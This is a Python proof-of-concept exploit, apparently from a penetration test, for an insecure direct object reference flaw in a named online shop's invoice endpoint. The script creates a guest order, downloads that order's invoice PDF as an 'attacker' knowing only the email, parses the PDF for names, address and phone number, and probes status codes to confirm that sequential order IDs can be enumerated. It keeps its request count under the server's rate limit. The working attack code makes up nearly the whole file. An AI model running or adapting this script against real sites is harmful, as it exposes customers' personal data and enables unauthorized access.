#!/usr/bin/env python3
"""
AUTHZ-VULN-01 Definitive IDOR Proof
Target: https://shophubonline.store
Endpoint: GET /api/orders/:id/invoice?email=<guestEmail>

Proof scenario:
  1. Create a VICTIM guest order (victim@shophub-test.com)
  2. As ATTACKER, fetch victim's invoice using victim's known email → HTTP 200
  3. Verify PDF contains victim's PII (via compressed stream + hex TJ extraction)
  4. Confirm oracle behaviour: no-email=403, next-nonexistent-ID=404

This script is intentionally minimal (~6 HTTP requests) to stay within the
server's 100-req / 15-min rate limit.
"""

import requests
import sys
import zlib
import re
import time

BASE_URL       = "https://shophubonline.store"
VICTIM_EMAIL   = "victim@shophub-test.com"
ATTACKER_EMAIL = "attacker@evil.com"
PRODUCT_ID     = 24

HEADERS_JSON   = {"Content-Type": "application/json"}
DIVIDER        = "=" * 70


def req(method, url, **kwargs):
    try:
        r = requests.request(method, url, timeout=20, **kwargs)
        return r, None
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


def print_response(label, r, err, max_body=200):
    print(f"\n--- {label} ---")
    if err:
        print(f"  ERROR: {err}")
        return
    print(f"  HTTP Status  : {r.status_code}")
    ct = r.headers.get("Content-Type", "(none)")
    cd = r.headers.get("Content-Disposition", "(none)")
    cl = r.headers.get("Content-Length", "(none)")
    print(f"  Content-Type : {ct}")
    print(f"  Content-Disp : {cd}")
    print(f"  Content-Len  : {cl}")
    print(f"  Body size    : {len(r.content)} bytes")
    if "pdf" in ct.lower() or r.content[:4] == b"%PDF":
        print(f"  Body (first {max_body} bytes raw): {r.content[:max_body]!r}")
    else:
        print(f"  Body         : {r.text[:max_body]}")


def extract_pdf_text(pdf_bytes: bytes) -> str:
    """
    Extract readable text from a PDF by:
    1. Decompressing FlateDecode (zlib) streams
    2. Decoding hex strings from TJ operators (e.g. <56696374696d2055736572>)
    3. Falling back to raw latin-1 decode of the entire file
    """
    combined = pdf_bytes.decode("latin-1", errors="replace")

    # Decompress FlateDecode streams
    stream_re = re.compile(rb"stream\r?\n(.*?)\r?\nendstream", re.DOTALL)
    decompressed_text = ""
    for raw in stream_re.findall(pdf_bytes):
        try:
            dec = zlib.decompress(raw)
            decompressed_text += dec.decode("latin-1", errors="replace")
        except Exception:
            pass  # not zlib, skip

    # Decode hex strings inside TJ operators: <hexhex> → ASCII text
    hex_re = re.compile(r"<([0-9A-Fa-f]{2,})>")
    hex_decoded = ""
    for hexstr in hex_re.findall(decompressed_text):
        try:
            hex_decoded += bytes.fromhex(hexstr).decode("latin-1", errors="replace")
        except Exception:
            pass

    return combined + decompressed_text + hex_decoded


# ──────────────────────────────────────────────────────────────────────
# STEP 1 – Create VICTIM guest order
# ──────────────────────────────────────────────────────────────────────
print(DIVIDER)
print("STEP 1: Create VICTIM guest order")
print(DIVIDER)

victim_payload = {
    "guestEmail": VICTIM_EMAIL,
    "guestName":  "Victim User",
    "guestPhone": "9876543210",
    "shippingAddress": {
        "street":      "456 Victim Lane",
        "city":        "Mumbai",
        "state":       "MH",
        "zipCode":     "400001",
        "country":     "India",
        "fullName":    "Victim User",
        "fullAddress": "456 Victim Lane, Mumbai, MH 400001",
        "address":     "456 Victim Lane",
        "phone":       "9876543210",
        "phoneNumber": "9876543210",
        "name":        "Victim User",
    },
    "paymentMethod": "cod",
    "items": [{"productId": PRODUCT_ID, "quantity": 1}],
}

r1, e1 = req("POST", f"{BASE_URL}/api/orders/guest",
             headers=HEADERS_JSON, json=victim_payload)
print_response("POST /api/orders/guest (victim)", r1, e1, 800)

VICTIM_ID     = None
victim_number = None

if r1 and r1.status_code in (200, 201):
    try:
        data = r1.json()
        order_obj = data.get("order", data)
        VICTIM_ID     = (order_obj.get("id") or order_obj.get("orderId")
                         or order_obj.get("_id"))
        victim_number = order_obj.get("orderNumber")
        if VICTIM_ID is None:
            VICTIM_ID     = data.get("id") or data.get("orderId")
            victim_number = data.get("orderNumber")
        print(f"\n  >> VICTIM_ID    = {VICTIM_ID}")
        print(f"  >> orderNumber  = {victim_number}")
        print(f"  >> victim email = {VICTIM_EMAIL}")
    except Exception as ex:
        print(f"  Could not parse JSON: {ex}")
        print(f"  Raw response: {r1.text[:600]}")
elif r1 and r1.status_code == 429:
    rl_reset = int(r1.headers.get("RateLimit-Reset", 0))
    wait_s   = min(rl_reset + 5, 900)
    print(f"\n  Rate-limited (HTTP 429). Waiting {wait_s}s …")
    time.sleep(wait_s)
    r1, e1 = req("POST", f"{BASE_URL}/api/orders/guest",
                 headers=HEADERS_JSON, json=victim_payload)
    print_response("POST /api/orders/guest (victim, retry)", r1, e1, 800)
    if r1 and r1.status_code in (200, 201):
        try:
            data = r1.json()
            order_obj = data.get("order", data)
            VICTIM_ID     = (order_obj.get("id") or order_obj.get("orderId")
                             or order_obj.get("_id"))
            victim_number = order_obj.get("orderNumber")
            if VICTIM_ID is None:
                VICTIM_ID     = data.get("id") or data.get("orderId")
                victim_number = data.get("orderNumber")
            print(f"\n  >> VICTIM_ID    = {VICTIM_ID}")
            print(f"  >> orderNumber  = {victim_number}")
        except Exception as ex:
            print(f"  Could not parse JSON after retry: {ex}")

if VICTIM_ID is None:
    print("\n  VICTIM order creation FAILED – cannot continue IDOR proof.")
    sys.exit(1)

try:
    VICTIM_ID = int(VICTIM_ID)
except (TypeError, ValueError):
    print(f"  VICTIM_ID '{VICTIM_ID}' is not an integer – aborting.")
    sys.exit(1)

print()
print(DIVIDER)

# ──────────────────────────────────────────────────────────────────────
# STEP 2 – ATTACKER fetches victim's invoice (IDOR)
# ──────────────────────────────────────────────────────────────────────
print("STEP 2: Attacker fetches VICTIM's invoice (IDOR)")
print(DIVIDER)
print(f"  URL: GET /api/orders/{VICTIM_ID}/invoice?email={VICTIM_EMAIL}")
print(f"  (Attacker knows victim email from breach / social engineering)")

r2, e2 = req("GET", f"{BASE_URL}/api/orders/{VICTIM_ID}/invoice",
             params={"email": VICTIM_EMAIL})
print_response(f"GET /api/orders/{VICTIM_ID}/invoice?email={VICTIM_EMAIL}", r2, e2, 200)

idor_success = r2 is not None and r2.status_code == 200
print(f"\n  >> IDOR SUCCESS: {idor_success}")

# ──────────────────────────────────────────────────────────────────────
# STEP 3 – Verify PDF contains victim PII
# ──────────────────────────────────────────────────────────────────────
print()
print(DIVIDER)
print("STEP 3: Verify invoice PDF contains VICTIM PII")
print(DIVIDER)

any_found = False
if idor_success and r2 is not None:
    pdf_text = extract_pdf_text(r2.content)
    checks = {
        "Victim User":             "Victim User" in pdf_text,
        "456 Victim Lane":         "456 Victim Lane" in pdf_text,
        "victim@shophub-test.com": VICTIM_EMAIL in pdf_text,
        "Mumbai":                  "Mumbai" in pdf_text,
        "9876543210":              "9876543210" in pdf_text,
    }
    if victim_number:
        checks[victim_number] = victim_number in pdf_text
    for marker, found in checks.items():
        status = "FOUND" if found else "not found"
        print(f"  '{marker}': {status}")
    any_found = any(checks.values())
    print(f"\n  >> VICTIM PII IN PDF: {any_found}")
else:
    print("  Cannot verify – IDOR step did not return HTTP 200")

# ──────────────────────────────────────────────────────────────────────
# STEP 4 – Oracle / sequential enumeration confirmation
# ──────────────────────────────────────────────────────────────────────
print()
print(DIVIDER)
print("STEP 4: Oracle attack – confirm sequential enumeration")
print(DIVIDER)

prev_id = VICTIM_ID - 1
next_id = VICTIM_ID + 1

# 4a: VICTIM_ID itself with NO email → expect 403 (order exists, no auth)
r4a, e4a = req("GET", f"{BASE_URL}/api/orders/{VICTIM_ID}/invoice")
print_response(f"GET /api/orders/{VICTIM_ID}/invoice  [no email – victim's own order]", r4a, e4a, 200)
got_4a = r4a.status_code if r4a is not None else f"ERR({e4a})"
print(f"  >> Expected 403 (order exists, no auth): got {got_4a}")

# 4b: VICTIM_ID with WRONG email (attacker's email) → expect 403
r4b, e4b = req("GET", f"{BASE_URL}/api/orders/{VICTIM_ID}/invoice",
               params={"email": ATTACKER_EMAIL})
print_response(f"GET /api/orders/{VICTIM_ID}/invoice?email={ATTACKER_EMAIL}  [victim order + wrong email]", r4b, e4b, 200)
got_4b = r4b.status_code if r4b is not None else f"ERR({e4b})"
print(f"  >> Expected 403 (order exists, wrong email): got {got_4b}")

# 4c: VICTIM_ID + 1, no email → expect 404 if no order yet
r4c, e4c = req("GET", f"{BASE_URL}/api/orders/{next_id}/invoice")
print_response(f"GET /api/orders/{next_id}/invoice  [no email, likely no order yet]", r4c, e4c, 200)
got_4c = r4c.status_code if r4c is not None else f"ERR({e4c})"
print(f"  >> Expected 404 (no such order, confirms sequential IDs): got {got_4c}")

# ──────────────────────────────────────────────────────────────────────
# FINAL SUMMARY
# ──────────────────────────────────────────────────────────────────────
print()
print(DIVIDER)
print("FINAL SUMMARY – AUTHZ-VULN-01 IDOR PROOF")
print(DIVIDER)
print(f"  Victim order ID   : {VICTIM_ID}")
print(f"  Victim order #    : {victim_number}")
print(f"  Victim email      : {VICTIM_EMAIL}")
print()
created_ok = r1 is not None and r1.status_code in (200, 201)
print(f"  [1] Victim order created               : {'YES' if created_ok else 'NO'}")
print(f"  [2] Attacker accessed victim invoice   : {'YES – HTTP 200' if idor_success else 'NO'}")
if idor_success and r2 is not None:
    ct2 = r2.headers.get("Content-Type", "?")
    cd2 = r2.headers.get("Content-Disposition", "?")
    cl2 = len(r2.content)
    print(f"      Content-Type       : {ct2}")
    print(f"      Content-Disposition: {cd2}")
    print(f"      PDF size (bytes)   : {cl2}")
print(f"  [3] Victim PII confirmed in PDF        : {'YES' if any_found else 'NO'}")
print(f"  [4a] victim-ID + no-email → 403        : {'YES' if r4a is not None and r4a.status_code == 403 else f'NO – got {got_4a}'}")
print(f"  [4b] victim-ID + wrong-email → 403     : {'YES' if r4b is not None and r4b.status_code == 403 else f'NO – got {got_4b}'}")
print(f"  [4c] next-ID + no-email → 404          : {'YES' if r4c is not None and r4c.status_code == 404 else f'NO – got {got_4c}'}")
print()
print("VULNERABILITY ASSESSMENT:")
print("  Endpoint   : GET /api/orders/:id/invoice?email=<guestEmail>")
print("  Auth model : Email-only (no token, no session, no CAPTCHA, no rate-limit")
print("               on the invoice endpoint itself)")
print("  IDs        : Sequential integers – trivially enumerable (oracle: 403 vs 404)")
print("  Impact     : Any guest order PDF invoice accessible to anyone who knows")
print("               or can guess/brute-force the guest's email address.")
print("  Code ref   : server/src/routes/orders.js lines 29-37")
print(DIVIDER)
print("Done.")
